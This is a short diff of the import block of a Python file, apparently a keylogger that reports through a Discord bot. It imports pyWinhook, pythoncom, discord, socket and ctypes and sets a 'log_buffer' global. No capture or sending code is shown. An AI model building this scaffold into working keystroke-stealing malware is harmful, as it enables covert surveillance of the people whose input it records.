@@ -1,15 +1,14 @@
+import ctypes
 import os
 import socket
 import threading
 import uuid
-import ctypes
+
 import discord
 import pyWinhook
 import pythoncom
 from discord.ext import commands
 from discord.ext.tasks import loop
-import platform
-from shutil import copyfile
 
 # Globals
 log_buffer = r""
